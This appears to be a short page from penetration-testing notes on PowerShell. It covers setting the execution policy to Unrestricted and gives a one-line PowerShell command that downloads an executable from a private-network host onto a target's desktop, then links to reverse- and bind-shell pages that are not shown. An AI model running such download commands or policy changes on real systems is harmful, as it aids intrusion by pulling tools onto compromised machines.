# PowerShell

## Enable PowerShell execution policy

* PowerShell maintains an execution policy that determines which type of PowerShell scripts \(if any\) can be run on the system. 
* The default policy is “Restricted”, which effectively means the system will neither load PowerShell configuration files nor run PowerShell scripts.
* To set an “Unrestricted” execution policy on our Windows client machine. Run Windows PowerShell application as Administrator.

```text
PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted
PS C:\WINDOWS\system32> Get-ExecutionPolicy
```

![](https://lh4.googleusercontent.com/5eEcCVnnBLRd4iYiO9ze7W9ow-L_EkITQKx0WQo3mPVeLasOK_lj2QkoU84hf5M4mTVY1ePTk214edOgr2d_EdpcXLwT1fRksnqihgTjFayRaPYbODWJtbKUfuI328_f-a3tL8aa)

## File Transfers

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.189/wget.exe','C:\Users\Administrator\Desktop\wget.exe')"
```

Also see:

{% page-ref page="../../collections/file-transfer.md" %}

## Reverse/Bind Shells

See the following:

{% page-ref page="../../collections/reverse-shell/powershell.md" %}

{% page-ref page="../../collections/bind-shell/powershell.md" %}



